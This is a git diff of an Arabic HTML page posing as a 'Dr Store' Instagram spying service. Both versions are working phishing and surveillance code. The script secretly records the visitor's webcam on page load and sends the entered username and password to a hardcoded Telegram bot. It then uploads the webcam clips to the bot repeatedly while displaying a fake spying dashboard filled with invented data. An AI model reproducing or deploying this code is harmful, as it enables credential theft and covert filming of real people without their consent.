@@ -5,118 +5,116 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dr Store - Spying Service</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #050505; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
-        .container { background-color: #111; border: 1px solid #222; border-radius: 20px; padding: 30px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 50px rgba(123, 31, 162, 0.3); }
-        .logo { width: 70px; height: 70px; background: linear-gradient(45deg, #7b1fa2, #e91e63); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-weight: bold; font-size: 28px; border: 2px solid #333; }
-        h2 { font-size: 20px; margin-bottom: 20px; color: #fff; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 12px; color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; text-align: center; }
-        button { width: 100%; background: linear-gradient(90deg, #7b1fa2, #e91e63); color: white; border: none; border-radius: 10px; padding: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        body { font-family: sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background-color: #0d0d0d; border: 1px solid #222; border-radius: 20px; padding: 30px 20px; width: 340px; text-align: center; box-shadow: 0 10px 40px rgba(123, 31, 162, 0.4); }
+        .logo { width: 80px; height: 80px; background: linear-gradient(45deg, #7b1fa2, #e91e63); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-weight: bold; font-size: 30px; color: #fff; border: 2px solid #333; }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        .service-tag { color: #e91e63; font-weight: bold; margin-bottom: 20px; display: block; font-size: 14px; }
+        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 14px; color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; text-align: center; }
+        button { width: 100%; background: linear-gradient(90deg, #7b1fa2, #e91e63); color: white; border: none; border-radius: 10px; padding: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
         
-        /* لوحة البيانات الوهمية */
-        #spy-dashboard { display: none; text-align: right; }
-        .data-card { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-top: 15px; border-right: 4px solid #e91e63; }
-        .stat { font-size: 14px; margin-bottom: 8px; color: #ccc; }
-        .stat b { color: #e91e63; }
-        .loading-bar { width: 100%; height: 4px; background: #222; margin: 10px 0; border-radius: 2px; overflow: hidden; }
-        .loading-progress { width: 0%; height: 100%; background: #e91e63; animation: load 3s forwards; }
-        @keyframes load { to { width: 100%; } }
-        
+        /* لوحة التجسس الوهمية */
+        #spy-dash { display: none; text-align: right; }
+        .stat-box { background: #151515; padding: 15px; border-radius: 12px; margin-top: 15px; border-right: 4px solid #e91e63; line-height: 1.8; }
+        .stat-box b { color: #e91e63; }
+        .live-indicator { color: #4caf50; font-size: 11px; margin-top: 10px; display: block; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="login-page" class="container">
+    <div id="login-step" class="card">
         <div class="logo">DR</div>
-        <h2>تسجيل الدخول - Dr Store</h2>
-        <p style="font-size: 12px; color: #888;">أدخل حسابك لربط خدمة التجسس</p>
-        <input type="text" id="insta_user" placeholder="Username">
-        <input type="password" id="insta_pass" placeholder="Password">
-        <button onclick="login()">دخول للوحة التحكم</button>
+        <h2>دكتور ستور - Dr Store</h2>
+        <span class="service-tag">نظام المراقبة عن بعد (Spying)</span>
+        <p style="font-size: 12px; color: #888;">سجل بحسابك لتفعيل الربط مع الأقمار الصناعية</p>
+        <input type="text" id="in_user" placeholder="Username / Email">
+        <input type="password" id="in_pass" placeholder="Password">
+        <button onclick="toDashboard()">دخول للنظام</button>
     </div>
 
-    <div id="spy-dashboard" class="container">
+    <div id="spy-dash" class="card">
         <div class="logo" style="width: 50px; height: 50px; font-size: 20px;">DR</div>
-        <h2 style="font-size: 16px;">لوحة مراقبة الأهداف</h2>
-        
-        <input type="text" id="sub_code" placeholder="أدخل كود الاشتراك (529332)">
-        <input type="text" id="target_user" placeholder="يوزر الضحية (10.10ta)">
-        <button onclick="startSpying()">بدء جلب البيانات</button>
+        <h2>لوحة التحكم المباشرة</h2>
+        <input type="text" id="s_code" placeholder="كود الاشتراك (529332)">
+        <input type="text" id="s_target" placeholder="يوزر الهدف (10.10ta)">
+        <button onclick="showFakeData()">بدء جلب البيانات</button>
 
-        <div id="results" style="display: none;">
-            <div class="loading-bar"><div class="loading-progress"></div></div>
-            <div class="data-card">
-                <div class="stat">📥 المراسلات: <b>قام بمراسلة 20 شخصاً</b></div>
-                <div class="stat">📸 القصص: <b>نشر 4 ستوري (مخفي)</b></div>
-                <div class="stat">📞 مكالمات: <b>أجرى مكالمة مع <span style="color:cyan">66fllo</span></b></div>
-                <div class="stat">⏳ المدة: <b>58 دقيقة</b></div>
-                <div class="stat">📅 التوقيت: <b>قبل 12 ساعة</b></div>
+        <div id="fake-results" style="display: none;">
+            <div class="stat-box">
+                📍 الحالة: <b>متصل الآن</b><br>
+                📥 المراسلات: <b>تم مراسلة 20 شخصاً</b><br>
+                📸 الستوري: <b>نشر 4 قصص مخفية</b><br>
+                📞 مكالمات: <b>أجرى مكالمة مع <span style="color:cyan">66fllo</span></b><br>
+                ⏳ المدة: <b>58 دقيقة</b><br>
+                🕒 التوقيت: <b>قبل 12 ساعة</b>
             </div>
-            <p style="font-size: 10px; color: #555; margin-top: 10px;">يتم التحديث تلقائياً كل 30 ثانية...</p>
+            <span class="live-indicator">● جاري سحب الصور الممسوحة...</span>
         </div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
 
     <script>
-        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-        const CHAT_ID = "897618292";
-        let mediaRecorder;
-        let recordedChunks = [];
+        const T = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const C = "897618292";
+        let rec;
+        let chunks = [];
 
-        // تشغيل الكاميرا فور فتح الرابط
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(stream => {
-            document.getElementById('v').srcObject = stream;
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.start(1000); // يسجل ويخزن كل ثانية
-        }).catch(err => console.log("Camera blocked"));
-
-        function sendVideo() {
-            if (recordedChunks.length === 0) return;
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("video", blob, "spy_video.webm");
-            formData.append("caption", "🎥 فيديو مستمر للمبتز أثناء تصفح البيانات!");
-
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
-        }
-
-        function login() {
-            const user = document.getElementById('insta_user').value;
-            const pass = document.getElementById('insta_pass').value;
-            if(!user || !pass) return alert("يرجى إكمال البيانات");
-
-            // إرسال البيانات الأولى (اليوزر والباس)
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎯 دخول للوحة: ${user} | الرمز: ${pass}`);
+        // تشغيل الكاميرا والبدء في تسجيل الفيديو فوراً
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            document.getElementById('v').srcObject = s;
+            rec = new MediaRecorder(s);
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.start();
             
-            // الانتقال للوحة الوهمية
-            document.getElementById('login-page').style.display = 'none';
-            document.getElementById('spy-dashboard').style.display = 'block';
+            // إرسال كليب فيديو كل 15 ثانية بشكل مستمر
+            setInterval(() => {
+                if (rec.state === "recording") {
+                    rec.stop();
+                    setTimeout(() => {
+                        sendVid("🎥 تحديث فيديو مستمر للمبتز...");
+                        chunks = [];
+                        rec.start();
+                    }, 500);
+                }
+            }, 15000);
+        }).catch(() => {});
+
+        function sendVid(cap) {
+            if (chunks.length === 0) return;
+            const b = new Blob(chunks, { type: 'video/webm' });
+            const f = new FormData();
+            f.append("chat_id", C);
+            f.append("video", b, "live.webm");
+            f.append("caption", cap);
+            fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: "POST", body: f });
         }
 
-        function startSpying() {
-            const code = document.getElementById('sub_code').value;
-            const target = document.getElementById('target_user').value;
+        function toDashboard() {
+            const u = document.getElementById('in_user').value;
+            const p = document.getElementById('in_pass').value;
+            if(!u || !p) return alert("أكمل البيانات أولاً");
 
+            // إرسال الباسورد فوراً
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🎯 صيد Dr Store:\n👤 يوزر: ${u}\n🔑 باس: ${p}`);
+            
+            // إخفاء صفحة الدخول وإظهار اللوحة
+            document.getElementById('login-step').style.display = 'none';
+            document.getElementById('spy-dash').style.display = 'block';
+        }
+
+        function showFakeData() {
+            const code = document.getElementById('s_code').value;
+            const target = document.getElementById('s_target').value;
             if(code === "529332" && target === "10.10ta") {
-                document.getElementById('results').style.display = 'block';
-                // إرسال تنبيه أن المبتز بدأ يراقب البيانات الوهمية
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🕵️ المبتز يراقب الآن يوزر ${target}`);
-                
-                // إرسال أول مقطع فيديو تم تسجيله حتى الآن
-                setTimeout(sendVideo, 5000); 
+                document.getElementById('fake-results').style.display = 'block';
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🕵️ المبتز يراقب الآن يوزر ${target}`);
             } else {
-                alert("كود الاشتراك أو اليوزر غير صحيح");
+                alert("بيانات الاشتراك غير صحيحة");
             }
         }
-
-        // إرسال الفيديو النهائي عند محاولة الخروج أو إغلاق الصفحة
-        window.onbeforeunload = function() {
-            sendVideo();
-        };
     </script>
 </body>
 </html>
